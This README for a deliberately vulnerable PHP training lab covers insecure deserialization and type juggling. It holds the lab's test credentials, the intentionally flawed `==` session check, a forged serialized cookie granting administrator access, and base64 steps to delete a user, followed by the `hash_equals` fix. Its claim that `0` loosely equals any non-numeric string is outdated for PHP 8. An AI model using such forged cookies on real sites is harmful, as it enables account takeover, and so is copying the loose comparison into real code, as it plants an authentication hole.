# Lab 02: Modifying Serialized Data Types

## Quick Reference

| Property | Value |
|----------|-------|
| **Vulnerability** | PHP Type Juggling with Loose Comparison |
| **Difficulty** | Practitioner |
| **Category** | Insecure Deserialization |
| **CWE** | CWE-502: Deserialization of Untrusted Data |
| **Objective** | Access admin panel, delete user `carlos` |

---

## Setup

### 1. Initialize Database

```bash
# Option 1: Browser
http://localhost/LABx_Docs/Insecure-Deserialization/Lab-02/setup_db.php

# Option 2: MySQL CLI
mysql -u root < database_setup.sql
```

### 2. Verify Setup

Navigate to the lab index and confirm login works with test credentials.

---

## Credentials

| Username | Password | Role |
|----------|----------|------|
| `wiener` | `peter` | User |
| `carlos` | `carlos123` | User |
| `administrator` | `admin_secret_pass` | Admin |

---

## Technical Details

### The Vulnerability

The application validates session cookies using PHP's loose comparison operator (`==`):

```php
if ($sessionData->access_token == $user['access_token']) {
    // Authentication passes
}
```

### The Exploit

PHP's type juggling causes integer `0` to equal any non-numeric string:

```php
0 == "a1b2c3d4e5f67890..."  // TRUE
```

### Payload Transformation

**Original Cookie (decoded):**
```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:64:"cafebabe...";}
```

**Exploit Payload (PHP 7 & 8):**
```
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";b:1;}
```

**Changes:**
- `s:6:"wiener"` → `s:13:"administrator"`
- `s:64:"..."` → `b:1` (string to boolean true)

---

## Solution Summary

1. Login as `wiener:peter`
2. Copy session cookie from browser
3. Base64 decode: `echo "cookie" | base64 -d`
4. Modify: Change username to `administrator`, change `access_token` from `s:64:"..."` to `b:1`
5. Base64 encode: `echo -n "payload" | base64`
6. Replace cookie and access `/admin.php`
7. Delete user `carlos`

---

## Files

| File | Description |
|------|-------------|
| `config.php` | Database config, vulnerable `validateSession()` |
| `index.php` | Lab entry point |
| `login.php` | Authentication handler |
| `my-account.php` | Displays decoded session |
| `admin.php` | Admin panel (delete users) |
| `success.php` | Lab completion |
| `docs.php` | Technical documentation |
| `setup_db.php` | Database initialization |

---

## Key Insight

PHP's loose comparison (`==`) performs type coercion. When comparing an integer with a string that doesn't start with a digit, the string converts to integer `0`:

```php
(int)"hello" === 0    // TRUE
0 == "hello"          // TRUE (type juggling)
0 === "hello"         // FALSE (strict - no juggling)
```

The fix is to use strict comparison (`===`) or `hash_equals()`:

```php
if (hash_equals($user['access_token'], $sessionData->access_token)) {
    // Secure comparison
}
```

---

## Resources

- [LAB_DOCUMENTATION.md](LAB_DOCUMENTATION.md) - Complete technical documentation
- [PHP Type Comparison Tables](https://www.php.net/manual/en/types.comparisons.php)
- [PortSwigger Insecure Deserialization](https://portswigger.net/web-security/deserialization)
